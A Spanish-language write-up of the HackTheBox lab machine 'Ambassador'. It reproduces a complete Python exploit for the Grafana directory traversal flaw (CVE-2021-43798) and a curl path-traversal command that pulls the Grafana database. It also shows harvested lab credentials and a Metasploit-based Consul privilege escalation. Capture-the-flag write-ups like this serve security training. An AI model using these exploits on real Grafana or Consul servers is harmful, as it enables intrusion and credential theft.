---
layout      : post
title       : "Ambassador - HackTheBox"
author      : elc4br4
image       : assets/images/HTB/Ambassador-HackTheBox/Ambassador.webp
category    : [ htb ]
tags        : [ Linux ]
---

📡Estoy ante una máquina Linux nivel `Medium` en la que aprovecharemos una vulnerabilidad de Grafena para leer usuarios, analizaremos brevemente un archivo base de datos, tocaremos un poco de SQL y acabremos con una escalada explotando una vulnerabilidad de un servicio denominado consul a través de un token y un módulo de metasploit📡.

🎥Canal Writeups Youtube🎬 --> [https://www.youtube.com/channel/UCllewdxU0OQudNp9-1IVJYQ](https://www.youtube.com/channel/UCllewdxU0OQudNp9-1IVJYQ)

![](/assets/images/HTB/Ambassador-HackTheBox/Ambassador2.webp)

![](/assets/images/HTB/Ambassador-HackTheBox/ambassador-rating.webp)

[![HTBadge](https://www.hackthebox.eu/badge/image/533771)](https://www.hackthebox.com/home/users/profile/533771)

![](/assets/images/HTB/Ambassador-HackTheBox/start.gif)

***


**Un pequeño INDICE**

1. [Reconocimiento](#reconocimiento).
    * [Reconocimiento de Puertos](#recon-nmap).
2. [Enumeración](#enumeración).
    * [Enumeración Web](#enum-web).
3. [Explotación](#explotacion).
    * [Grafana Directory Traversal](#Grafana-Directory-Traversal).
4. [Escalada de Privilegios](#privesc). 
    * [Consul Service](#Consul-service)
    
    
***

# Reconocimiento [#](reconocimiento) {#reconocimiento}

***

## Reconocimiento de Puertos [🔍](#recon-nmap) {#recon-nmap}

Como siempre comenzamos lanzando nmap para encontrar los puertos abiertos en la máquina.

```bash
# Comando para el reconocimiento de puertos
-------------------------------------------
nmap -p- -Pn -n -sS --min-rate 5000 10.10.11.183 -oG escaneo1

# Puertos Abiertos
------------------
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
3306/tcp open  mysql
```

Realizo un escaneo más avanzado para obtener más información acerca de los servicios que corren en los puertos abiertos.

![](/assets/images/HTB/Ambassador-HackTheBox/nmap1.webp)

![](/assets/images/HTB/Ambassador-HackTheBox/nmap2.webp)

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | ssh      | OpenSSH 8.2p1 Ubuntu |
| 80     | http     | Apache httpd 2.4.41 |
| 3000   | ppp      | ¿Servidor WEB? |
| 3306   | mysql    | MySQL 8.0.30 |

* Servidor Web en el puerto 80 (Aapache httpd 2.4.41)
* ¿Servidor Web en el puerto 3000? (ppp)

# Enumeración [#](enumeración) {#enumeración}

***

## Enumeración Web [🔢](#enum-web) {#enum-web}

Procedo a enumerar un poco el servidor web, en mi caso sentía la curiosidad de saber que había en el puerto 3000 asique fue lo primero que miré.

Al acceder encuentro lo siguiente:

![](/assets/images/HTB/Ambassador-HackTheBox/grafana.webp)

Estamos ante Grafana, que para el que no sepa lo que es:

```bash
# Grafana
Grafana es un software libre basado en licencia de Apache 2.0, ​ que permite la visualización y el formato de datos métricos. Permite crear cuadros de mando y gráficos a partir de múltiples fuentes, incluidas bases de datos de series de tiempo como Graphite, InfluxDB y OpenTSDB.
```

> Más info aquí --> [https://pandorafms.com/blog/es/que-es-grafana/](https://pandorafms.com/blog/es/que-es-grafana/)

Busco alguna vulnerabilidad existente en el mismo a través de searchsploit.

![](/assets/images/HTB/Ambassador-HackTheBox/searchsploit1.webp)

Hay una vulnerabilidad que podemos aprovechar, existe un Directory Traversal and Arbitrary File Read.

# Explotación [#](explotación) {#explotación}

***

## Grafana Directory Traversal [🔢](#Grafana Directory Traversal ) {#Grafana-Directory-Traversal }

Básicamente a través de esta vulnerabilidad podemos leer archivos del sistema.

```python
# Exploit Title: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read
# Date: 08/12/2021
# Exploit Author: s1gh
# Vulnerability Details: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p
# Description: Grafana versions 8.0.0-beta1 through 8.3.0 is vulnerable to directory traversal, allowing access to local files.
# CVE: CVE-2021-43798


#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import argparse
import sys
from random import choice

plugin_list = [
    "alertlist",
    "annolist",
    "barchart",
    "bargauge",
    "candlestick",
    "cloudwatch",
    "dashlist",
    "elasticsearch",
    "gauge",
    "geomap",
    "gettingstarted",
    "grafana-azure-monitor-datasource",
    "graph",
    "heatmap",
    "histogram",
    "influxdb",
    "jaeger",
    "logs",
    "loki",
    "mssql",
    "mysql",
    "news",
    "nodeGraph",
    "opentsdb",
    "piechart",
    "pluginlist",
    "postgres",
    "prometheus",
    "stackdriver",
    "stat",
    "state-timeline",
    "status-histor",
    "table",
    "table-old",
    "tempo",
    "testdata",
    "text",
    "timeseries",
    "welcome",
    "zipkin"
]

def exploit(args):
    s = requests.Session()
    headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.' }

    while True:
        file_to_read = input('Read file > ')

        try:
            url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read
            req = requests.Request(method='GET', url=url, headers=headers)
            prep = req.prepare()
            prep.url = url
            r = s.send(prep, verify=False, timeout=3)

            if 'Plugin file not found' in r.text:
                print('[-] File not found\n')
            else:
                if r.status_code == 200:
                    print(r.text)
                else:
                    print('[-] Something went wrong.')
                    return
        except requests.exceptions.ConnectTimeout:
            print('[-] Request timed out. Please check your host settings.\n')
            return
        except Exception:
            pass

def main():
    parser = argparse.ArgumentParser(description="Grafana V8.0.0-beta1 - 8.3.0 - Directory Traversal and Arbitrary File Read")
    parser.add_argument('-H',dest='host',required=True, help="Target host")
    args = parser.parse_args()

    try:
        exploit(args)
    except KeyboardInterrupt:
        return


if __name__ == '__main__':
    main()
    sys.exit(0)
```

Este exploit básicamente explota el Directory traversal a través de la ruta /public/plugins/<plugin> que lo saca de una lista (plugin_list), añade el directory traversal (../../) y acaba con el archivo que pretendemos leer, de forma que también podríamos explotar esta vulnerabilidad de forma manual a través de la terminal.

Descargo el exploit y lo ejecuto de la siguiente forma para intentar leer el archivo passwd.

![](/assets/images/HTB/Ambassador-HackTheBox/passwd.webp)

Podemos leer el archivo passwd y vemos que hay  usuarios de importancia.

*developer, root

Llegados a este punto, necesitamos obtener credenciales para acceder a Grafana, por lo que busco información acerca de Grafana y sus rutas y archivos.

Encuentro el siguiente post --> [https://www.programmerclick.com/article/10181235704/](https://www.programmerclick.com/article/10181235704/)

En este post encuentro la ruta del archivo de configuración de grafana, situado en la ruta `/etc/grafana/grafana.ini`

A través de la vulnerabilidad encontrada leo el archivo, que es un archivo bastante amplio, asique poco a poco lo voy leyendo y encuentro varias cosas:

![](/assets/images/HTB/Ambassador-HackTheBox/credenciales.webp)

Encuentro unas credenciales de acceso al panel Grafana.

> admin:messageInABottle685427

Pero continúo buscando ya que tenemos el puerto mysql abierto.

![](/assets/images/HTB/Ambassador-HackTheBox/dbpath.webp)

Tenemos una ruta donde se almacenan las bases de datos dentro de Grafana y busco si grafana tiene su propia base de datos, y por suerte lo encuentro.

![](/assets/images/HTB/Ambassador-HackTheBox/grafanadb.webp)

Por lo tanto, tenemos credenciales de acceso al panel Grafana, tenemos la ruta donde se almacenan las bases de datos y tenemos el nombre de la base de datos.

LLegado a este punto intento descargar la base de datos a través de la vulnerabilidad explotada anteriormente para leer archivos pero de forma manual.

```bash
# Comando para descargar la base de datos
-----------------------------------------
curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
```

![](/assets/images/HTB/Ambassador-HackTheBox/grafanadb2.webp)

Una vez descargada la abro y analizo con la herramienta `sqlitebrowser`

Desde el apartado hoja de datos vamos mirando en todas las tablas buscando datos de interés, hasta que doy con la tabla idónea en la que encuentro unas credenciales:

![](/assets/images/HTB/Ambassador-HackTheBox/sqlite.webp)

Por lo que veo, estas credenciales podrían servirme para acceder a la base de datos mysql, asique vamos a intentarlo.

![](/assets/images/HTB/Ambassador-HackTheBox/mysql1.webp)

Y conseguimos acceso a la base de datos local, ahora solo debemos buscar información o credenciales que me puedan servir.

![](/assets/images/HTB/Ambassador-HackTheBox/mysql2.webp)

Y ahí tengo las credenciales que necesitaba, el usuario developer y una contraseña encodeada en base64 que voy a decodear para continuar.

![](/assets/images/HTB/Ambassador-HackTheBox/base64.webp)

Ahora si ya podemos intentar conectarnos a la máquina por ssh con estas credenciales.

> developer:anEnglishManInNewYork027468

Me conecto y ya puedo leer la flag user.txt, pero antes ejecuto 2 comandos para tener la sesión ssh más funcional.

```bash
# Comandos sesión más funcional
-------------------------------
EXPORT TERM=xterm
EXPORT SHELL=bash
```

Y a continuación leo la flag user.txt.

![](/assets/images/HTB/Ambassador-HackTheBox/user.webp)

Y ya nos queda el último paso, escalar privilegios!!!

# Escalada de Privilegios [#](privesc) {#privesc}

***

## Consul Service [🔢](#Consul Service) {#Consul-service}



Enumerando un poco el sistema encuentro en la ruta /opt varios directorios.

![](/assets/images/HTB/Ambassador-HackTheBox/privesc1.webp)

Tenemos el directorio consul y el directorio my-app.

Buscando información acerca de que es consul encuentro esto.

![](/assets/images/HTB/Ambassador-HackTheBox/consul.webp)

LLegado a este punto miro a ver si podría existir alguna vulnerabilidad en este servicio.

![](/assets/images/HTB/Ambassador-HackTheBox/searchsploit2.webp)

Tenemos una vulnerabilidad pero necesitamos la api, asique procedo a buscar este token en los directorios encontrados,

Enumero el contenido de las carpetas y en el directorio my-app veo esto.

![](/assets/images/HTB/Ambassador-HackTheBox/my-app.webp)

Parece un repositorio de github, asique podemos usar comandos de git para buscar contenido.

Lanzo el comando `git show` y encontramos el token que necesitabamos.

![](/assets/images/HTB/Ambassador-HackTheBox/token.webp)

Asique una vez que tengo el token procedo a explotar esta vulnerabilidad a través de metasploit.

Pero antes de esto debemos crear un tunel ssh ya que este servicio consul se ejecuta en el puerto 8500 de forma local y debemos acceder al mismo en el momento que lanzamos el exploit.

![](/assets/images/HTB/Ambassador-HackTheBox/netstat.webp)

Asique creo el túnel ssh con el siguiente comando:

![](/assets/images/HTB/Ambassador-HackTheBox/ssh-tunnel.webp)

Y una vez creado el túnel ya puedo configurar el exploit y lanzarlo.

![](/assets/images/HTB/Ambassador-HackTheBox/msfconsole1.webp)

Y una vez configurado lo lanzo y me convierto en root.

![](/assets/images/HTB/Ambassador-HackTheBox/root.webp)

![](/assets/images/HTB/Ambassador-HackTheBox/share.webp)

![](/assets/images/HTB/Ambassador-HackTheBox/hacked.gif)















